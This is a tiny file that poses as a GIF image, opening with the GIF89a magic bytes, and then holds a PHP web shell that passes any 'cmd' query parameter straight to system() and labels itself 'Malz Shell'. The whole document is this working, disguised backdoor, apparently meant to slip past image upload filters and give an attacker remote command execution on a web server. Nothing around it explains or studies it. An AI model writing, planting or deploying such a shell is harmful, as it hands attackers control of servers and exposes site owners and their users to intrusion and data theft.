GIF89a
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
} else {
    echo "Malz Shell - use ?cmd=id";
}
?>
